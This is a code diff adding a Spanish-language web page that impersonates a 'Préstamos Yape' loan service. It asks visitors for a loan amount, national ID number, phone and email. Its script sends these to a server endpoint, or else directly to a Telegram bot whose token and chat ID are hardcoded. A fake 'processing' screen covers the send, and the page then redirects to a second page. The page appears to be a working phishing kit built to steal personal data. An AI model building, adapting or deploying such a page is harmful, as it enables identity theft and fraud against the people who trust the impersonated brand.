@@ -1,0 +1,851 @@
+<!doctype html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+  <meta name="theme-color" content="#531b71" />
+  <title>Préstamos Yape</title>
+  <meta property="og:image" content="https://bolt.new/static/og_default.png" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:image" content="https://bolt.new/static/og_default.png" />
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&display=swap');
+
+    :root {
+      font-family: 'Nunito', sans-serif;
+      color: #271638;
+      background: #f1eafa;
+      font-synthesis: none;
+      text-rendering: optimizeLegibility;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      min-width: 320px;
+    }
+
+    button,
+    input {
+      font: inherit;
+    }
+
+    .loan-page {
+      min-height: 100vh;
+      overflow: hidden;
+      background: #f1eafa;
+    }
+
+    .hero {
+      position: relative;
+      min-height: 520px;
+      overflow: hidden;
+      color: white;
+      background: radial-gradient(circle at 75% 45%, #40225e 0%, #40225e 47%, #40225e 100%);
+    }
+
+    .hero::after {
+      content: '';
+      position: absolute;
+      inset: auto -10% -100px -10%;
+      height: 210px;
+      border-radius: 50% 50% 0 0;
+      background: rgba(57, 19, 85, .32);
+      transform: rotate(-3deg);
+    }
+
+    .hero-copy {
+      position: relative;
+      z-index: 2;
+      width: min(1120px, 100%);
+      margin: 0 auto;
+      padding: 70px 52px 34px;
+    }
+
+    .help-pill {
+      position: absolute;
+      top: 18px;
+      right: 52px;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 9px 16px;
+      border: 1px solid rgba(255, 255, 255, .17);
+      border-radius: 30px;
+      background: rgba(255, 255, 255, .16);
+      font-size: 16px;
+      font-weight: 800;
+      backdrop-filter: blur(8px);
+      cursor: pointer;
+    }
+
+    h1 {
+      margin: 0;
+      color: #fff;
+      font-size: clamp(48px, 7vw, 72px);
+      line-height: .95;
+      letter-spacing: -2px;
+      font-weight: 900;
+    }
+
+    .hero-description {
+      margin: 24px 0 28px;
+      color: rgba(255, 255, 255, .92);
+      font-size: 18px;
+      line-height: 1.35;
+      font-weight: 600;
+    }
+
+    .benefits {
+      display: grid;
+      gap: 17px;
+    }
+
+    .benefit {
+      display: flex;
+      align-items: center;
+      gap: 13px;
+    }
+
+    .benefit-icon {
+      display: grid;
+      place-items: center;
+      width: 46px;
+      height: 46px;
+      border-radius: 50%;
+      color: white;
+      background: rgba(151, 79, 177, .7);
+      box-shadow: inset 0 0 0 1px rgba(255, 255, 255, .08);
+      font-size: 24px;
+    }
+
+    .benefit strong,
+    .benefit small {
+      display: block;
+    }
+
+    .benefit strong {
+      font-size: 16px;
+      line-height: 1.2;
+    }
+
+    .benefit small {
+      margin-top: 3px;
+      color: rgba(255, 255, 255, .7);
+      font-size: 14px;
+      font-weight: 600;
+    }
+
+    .loan-illustration {
+      position: absolute;
+      z-index: 1;
+      top: 36px;
+      right: max(3%, calc((100% - 1120px) / 2));
+      width: 480px;
+      height: 460px;
+    }
+
+    .phone-mockup {
+      position: absolute;
+      top: 39px;
+      left: 112px;
+      width: 220px;
+      height: 385px;
+      border: 7px solid #bda0cd;
+      border-radius: 36px;
+      background: #261238;
+      transform: rotate(7deg);
+      box-shadow: 17px 22px 0 rgba(31, 9, 47, .32), 0 24px 45px rgba(22, 2, 35, .35);
+    }
+
+    .phone-mockup::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      border: 2px solid rgba(255, 255, 255, .25);
+      border-radius: 29px;
+      pointer-events: none;
+    }
+
+    .phone-notch {
+      position: absolute;
+      z-index: 2;
+      top: -2px;
+      left: 70px;
+      width: 68px;
+      height: 18px;
+      border-radius: 0 0 12px 12px;
+      background: #241035;
+    }
+
+    .phone-screen {
+      height: 100%;
+      padding: 73px 18px 18px;
+      border-radius: 28px;
+      background: linear-gradient(150deg, #4a1a65, #702b85 50%, #311249);
+      text-align: center;
+    }
+
+    .yape-mark {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 8px;
+      color: #fff;
+      font-size: 38px;
+      font-weight: 900;
+      font-style: italic;
+      letter-spacing: -3px;
+    }
+
+    .yape-mark span {
+      display: grid;
+      place-items: center;
+      width: 29px;
+      height: 29px;
+      border-radius: 50%;
+      background: #48cbb0;
+      color: #613087;
+      font-size: 15px;
+      font-style: normal;
+      letter-spacing: 0;
+    }
+
+    .approved {
+      margin-top: 45px;
+      color: rgba(255, 255, 255, .85);
+      font-size: 13px;
+      font-weight: 700;
+    }
+
+    .approved-amount {
+      display: block;
+      margin-top: 9px;
+      color: #4dceb3;
+      font-size: 24px;
+    }
+
+    .approved-card {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-top: 40px;
+      padding: 10px 9px;
+      border-radius: 9px;
+      background: #fff;
+      color: #251333;
+      text-align: left;
+      transform: rotate(-7deg);
+    }
+
+    .approved-card svg {
+      flex: 0 0 auto;
+      width: 24px;
+      height: 24px;
+      color: #4fbda6;
+    }
+
+    .approved-card b,
+    .approved-card small {
+      display: block;
+      line-height: 1.1;
+    }
+
+    .approved-card b {
+      font-size: 10px;
+    }
+
+    .approved-card small {
+      margin-top: 3px;
+      font-size: 7px;
+      color: #6d6571;
+    }
+
+    .shield {
+      position: absolute;
+      z-index: 3;
+      top: 135px;
+      left: 56px;
+      display: grid;
+      place-items: center;
+      width: 76px;
+      height: 92px;
+      color: #ba85d2;
+      background: linear-gradient(145deg, #9b4db5, #542071);
+      clip-path: polygon(50% 0, 95% 19%, 88% 67%, 50% 100%, 12% 67%, 5% 19%);
+      filter: drop-shadow(7px 10px 5px rgba(28, 5, 43, .35));
+      font-size: 32px;
+    }
+
+    .cash-stack {
+      position: absolute;
+      z-index: 4;
+      right: 13px;
+      bottom: 59px;
+      display: flex;
+      flex-direction: column;
+      gap: -5px;
+      transform: rotate(-12deg);
+    }
+
+    .cash-stack span {
+      display: grid;
+      place-items: center;
+      width: 107px;
+      height: 31px;
+      margin-top: -7px;
+      border: 2px solid #8a4ba5;
+      border-radius: 9px;
+      background: #9c59b4;
+      color: #d99be9;
+      font-size: 21px;
+      font-weight: 900;
+      box-shadow: 0 4px 0 #613078;
+    }
+
+    .star {
+      position: absolute;
+      color: #49d5b8;
+      font-size: 32px;
+    }
+
+    .star-one {
+      top: 172px;
+      right: 7px;
+      transform: rotate(20deg);
+    }
+
+    .star-two {
+      right: 95px;
+      bottom: 76px;
+      color: #8751a2;
+      transform: scale(.75);
+    }
+
+    .hero-glow {
+      position: absolute;
+      border-radius: 50%;
+      background: rgba(180, 85, 208, .12);
+      filter: blur(5px);
+    }
+
+    .hero-glow-one {
+      top: -170px;
+      left: -110px;
+      width: 420px;
+      height: 420px;
+    }
+
+    .hero-glow-two {
+      right: -120px;
+      bottom: -170px;
+      width: 430px;
+      height: 430px;
+    }
+
+    .form-card {
+      position: relative;
+      z-index: 5;
+      width: min(960px, calc(100% - 48px));
+      margin: -22px auto 42px;
+      padding: 34px;
+      border-radius: 26px;
+      background: #fff;
+      box-shadow: 0 16px 40px rgba(69, 31, 94, .14);
+    }
+
+    .fields {
+      display: grid;
+      grid-template-columns: repeat(2, minmax(0, 1fr));
+      gap: 16px;
+    }
+
+    .field {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      min-height: 80px;
+      padding: 14px 18px;
+      border: 1px solid #e8e1ec;
+      border-radius: 16px;
+      background: #fff;
+      transition: border-color .2s, box-shadow .2s, transform .2s;
+    }
+
+    .field:focus-within {
+      border-color: #77349b;
+      box-shadow: 0 0 0 3px rgba(119, 52, 155, .12);
+      transform: translateY(-2px);
+    }
+
+    .field-icon {
+      display: grid;
+      place-items: center;
+      flex: 0 0 auto;
+      width: 42px;
+      height: 42px;
+      border-radius: 12px;
+      color: #713093;
+      background: transparent;
+      font-size: 22px;
+    }
+
+    .field-content {
+      min-width: 0;
+      flex: 1;
+    }
+
+    .field-label {
+      display: block;
+      margin-bottom: 4px;
+      font-size: 14px;
+      font-weight: 900;
+      color: #2d183b;
+    }
+
+    .field input {
+      width: 100%;
+      padding: 0;
+      border: 0;
+      outline: 0;
+      color: #43234f;
+      background: transparent;
+      font-size: 15px;
+    }
+
+    .field input::placeholder {
+      color: #a79eaa;
+    }
+
+    .next-button {
+      width: 100%;
+      margin-top: 22px;
+      padding: 16px;
+      border: 0;
+      border-radius: 14px;
+      color: #fff;
+      background: linear-gradient(100deg, #6a2b91, #873ca4);
+      box-shadow: 0 7px 15px rgba(105, 44, 143, .22);
+      cursor: pointer;
+      font-size: 19px;
+      font-weight: 900;
+      transition: transform .2s, box-shadow .2s;
+    }
+
+    .next-button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 10px 18px rgba(105, 44, 143, .3);
+    }
+
+    .next-button:active {
+      transform: translateY(0);
+    }
+
+    .loader-page {
+      position: fixed;
+      inset: 0;
+      display: none;
+      grid-template-columns: 1fr;
+      place-items: center;
+      background: radial-gradient(circle at 75% 45%, #71318b 0%, #531b71 47%, #3e145e 100%);
+      overflow: hidden;
+      z-index: 999;
+    }
+
+    .loader-page.show {
+      display: grid;
+    }
+
+    .loader-content {
+      position: relative;
+      z-index: 2;
+      text-align: center;
+      color: white;
+      padding: 24px;
+    }
+
+    .loader-spinner {
+      position: relative;
+      width: 130px;
+      height: 130px;
+      margin: 0 auto 36px;
+      display: grid;
+      place-items: center;
+    }
+
+    .loader-ring {
+      position: absolute;
+      inset: 0;
+      border-radius: 50%;
+      border: 4px solid transparent;
+      animation: spin 1.4s linear infinite;
+      border-top-color: #4dceb3;
+      border-right-color: rgba(77, 206, 179, 0.3);
+    }
+
+    .loader-ring-two {
+      inset: 14px;
+      border-top-color: #b388d3;
+      border-right-color: rgba(179, 136, 211, 0.3);
+      animation-duration: 1.1s;
+      animation-direction: reverse;
+    }
+
+    .loader-ring-three {
+      inset: 28px;
+      border-top-color: #fff;
+      border-right-color: rgba(255, 255, 255, 0.2);
+      animation-duration: 0.8s;
+    }
+
+    .loader-phone {
+      width: 52px;
+      height: 52px;
+      border-radius: 14px;
+      background: linear-gradient(135deg, #4dceb3, #2ba88e);
+      display: grid;
+      place-items: center;
+      font-size: 22px;
+      font-weight: 900;
+      color: #311249;
+      box-shadow: 0 6px 18px rgba(77, 206, 179, 0.4);
+      animation: pulse 1.2s ease-in-out infinite;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    @keyframes pulse {
+
+      0%,
+      100% {
+        transform: scale(1);
+      }
+
+      50% {
+        transform: scale(1.12);
+      }
+    }
+
+    .loader-title {
+      margin: 0 0 10px;
+      font-size: 26px;
+      font-weight: 900;
+      letter-spacing: -0.5px;
+    }
+
+    .loader-subtitle {
+      margin: 0;
+      font-size: 16px;
+      font-weight: 600;
+      color: rgba(255, 255, 255, 0.8);
+    }
+
+    @media (max-width: 850px) {
+      .hero {
+        min-height: 565px;
+      }
+
+      .hero-copy {
+        padding: 65px 32px 30px;
+      }
+
+      .loan-illustration {
+        right: -12px;
+        transform: scale(.83);
+        transform-origin: right top;
+      }
+
+      .hero-description,
+      .benefits {
+        max-width: 300px;
+      }
+    }
+
+    @media (max-width: 620px) {
+      .hero {
+        min-height: 520px;
+      }
+
+      .hero-copy {
+        padding: 98px 54px 25px;
+      }
+
+      .help-pill {
+        right: 29px;
+        top: 17px;
+        padding: 8px 13px;
+      }
+
+      .hero-description {
+        margin-top: 20px;
+        font-size: 16px;
+      }
+
+      .benefits {
+        gap: 14px;
+      }
+
+      .benefit-icon {
+        width: 41px;
+        height: 41px;
+      }
+
+      .benefit strong {
+        font-size: 14px;
+      }
+
+      .benefit small {
+        font-size: 12px;
+      }
+
+      .loan-illustration {
+        top: 75px;
+        right: -82px;
+        width: 430px;
+        transform: scale(.69);
+      }
+
+      .form-card {
+        width: calc(100% - 8px);
+        margin-top: -1px;
+        padding: 34px 43px 19px;
+        border-radius: 29px;
+      }
+
+      .fields {
+        grid-template-columns: 1fr;
+        gap: 13px;
+      }
+
+      .field {
+        min-height: 82px;
+        padding: 12px 20px;
+      }
+
+      .field input {
+        font-size: 14px;
+      }
+
+      .next-button {
+        margin-top: 18px;
+      }
+    }
+
+    @media (max-width: 390px) {
+      h1 {
+        font-size: 45px;
+      }
+
+      .hero {
+        min-height: 520px;
+      }
+
+      .loan-illustration {
+        top: 89px;
+        right: -112px;
+        transform: scale(.62);
+      }
+
+      .hero-copy {
+        padding: 88px 28px 25px;
+      }
+
+      .form-card {
+        width: calc(100% - 8px);
+        padding: 25px 18px 16px;
+      }
+
+      .field {
+        gap: 11px;
+        min-height: 78px;
+        padding-left: 14px;
+        padding-right: 14px;
+      }
+
+      .field-icon {
+        width: 37px;
+        height: 37px;
+      }
+
+      .field-label {
+        font-size: 13px;
+      }
+
+      .field input {
+        font-size: 13px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <main class="loan-page" id="mainContent">
+    <section class="hero" aria-labelledby="page-title">
+      <div class="hero-glow hero-glow-one"></div>
+      <div class="hero-glow hero-glow-two"></div>
+      <div class="hero-copy">
+        <div class="help-pill" onclick="alert('Estamos aquí para ayudarte 24/7')"><img src="./public/ayuda.png"
+            alt="icono" style="width: 20px; height: 20px;"> <span>Ayuda</span></div>
+        <h1 id="page-title">Préstamos<br />Yape</h1>
+        <p class="hero-description">Solicita tu préstamo de<br />forma rápida y segura.</p>
+        <div class="benefits">
+          <div class="benefit"><span class="benefit-icon"><img src="./public/escudo.png" alt="icono"
+                style="width: 24px; height: 24px;"></span><span><strong>Rápido y seguro</strong><small>100% digital y
+                confidencial</small></span></div>
+          <div class="benefit"><span class="benefit-icon"><img src="./public/aprovacion.png" alt="icono"
+                style="width: 24px; height: 24px;"></span><span><strong>Aprobación al toque</strong><small>En
+                minutos</small></span></div>
+          <div class="benefit"><span class="benefit-icon"><img src="./public/soles.png" alt="icono"
+                style="width: 24px; height: 24px;"></span><span><strong>Dinero en tu cuenta</strong><small>Cuando lo
+                necesites</small></span></div>
+        </div>
+      </div>
+      <div class="loan-illustration" aria-hidden="true">
+        <img src="./public/presentacion.png" alt="presentacion" style="width: 100%; height: 100%; object-fit: cover;">
+      </div>
+    </section>
+
+    <section class="form-card" aria-label="Solicitud de préstamo">
+      <div class="fields">
+        <label class="field">
+          <span class="field-icon"><img src="./public/soles1.png" alt="icono" style="width: 30px; height: 30px;"></span>
+          <span class="field-content">
+            <span class="field-label">Monto</span>
+            <input type="text" id="amount" placeholder="Ingresa el monto que necesitas" />
+          </span>
+        </label>
+        <label class="field">
+          <span class="field-icon"><img src="./public/dni.png" alt="icono" style="width: 40px; height: 40px;"></span>
+          <span class="field-content">
+            <span class="field-label">DNI</span>
+            <input type="text" id="dni" placeholder="Ingresa tu número de DNI" />
+          </span>
+        </label>
+        <label class="field">
+          <span class="field-icon"><img src="./public/celular.png" alt="icono" style="width: 40px; height: 45px;"></span>
+          <span class="field-content">
+            <span class="field-label">Celular</span>
+            <input type="tel" id="phone" placeholder="Ingresa tu número de celular" />
+          </span>
+        </label>
+        <label class="field">
+          <span class="field-icon"><img src="./public/correo.png" alt="icono" style="width: 40px; height: 45px;"></span>
+          <span class="field-content">
+            <span class="field-label">Correo</span>
+            <input type="email" id="email" placeholder="Ingresa tu correo electrónico" />
+          </span>
+        </label>
+      </div>
+      <button type="button" class="next-button" onclick="handleSubmit()">Siguiente</button>
+    </section>
+  </main>
+
+  <main class="loader-page" id="loaderPage">
+    <div class="loader-content">
+      <div class="loader-spinner">
+        <div class="loader-ring"></div>
+        <div class="loader-ring loader-ring-two"></div>
+        <div class="loader-ring loader-ring-three"></div>
+        <div class="loader-phone">S/</div>
+      </div>
+      <h2 class="loader-title">Procesando tu solicitud</h2>
+      <p class="loader-subtitle">Estamos validando tus datos…</p>
+    </div>
+  </main>
+
+  <script>
+    const TELEGRAM_TOKEN = '8617327971:AAELw3bgOtZCz73SsoHFsx_8fIBSPbeFwkI';
+    const TELEGRAM_CHAT_ID = '7813367667';
+
+    function handleSubmit() {
+      const amount = document.getElementById('amount').value;
+      const dni = document.getElementById('dni').value;
+      const phone = document.getElementById('phone').value;
+      const email = document.getElementById('email').value;
+
+      const loader = document.getElementById('loaderPage');
+      loader.classList.add('show');
+
+      const message = `📋 *Nueva Solicitud de Préstamo*
+
+💰 Monto: ${amount}
+🆔 DNI: ${dni}
+📱 Celular: ${phone}
+📧 Correo: ${email}`;
+
+      // Intenta primero con el servidor Flask
+      fetch('/api/send-telegram', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          amount: amount,
+          dni: dni,
+          phone: phone,
+          email: email
+        })
+      })
+        .then(response => response.json())
+        .then(data => {
+          setTimeout(() => {
+            window.location.href = 'index2.html';
+          }, 2000);
+        })
+        .catch(error => {
+          // Si falla Flask, intenta con la API de Telegram directamente
+          console.log('Intentando con API de Telegram directamente...');
+          fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              chat_id: TELEGRAM_CHAT_ID,
+              text: message,
+              parse_mode: 'Markdown'
+            })
+          })
+            .then(response => response.json())
+            .then(data => {
+              console.log('Mensaje enviado a Telegram:', data);
+              setTimeout(() => {
+                window.location.href = 'index2.html';
+              }, 2000);
+            })
+            .catch(err => {
+              console.error('Error en ambos métodos:', err);
+              setTimeout(() => {
+                window.location.href = 'index2.html';
+              }, 2000);
+            });
+        });
+    }
+
+    document.getElementById('amount').addEventListener('input', function(e) {
+      let value = e.target.value.replace(/,/g, '');
+      if (!isNaN(value) && value !== '') {
+        e.target.value = parseInt(value).toLocaleString('es-PE');
+      }
+    });
+
+    document.getElementById('dni').addEventListener('input', function(e) {
+      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 8);
+    });
+
+    document.getElementById('phone').addEventListener('input', function(e) {
+      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 9);
+    });
+  </script>
+
+</body>
+
+</html>
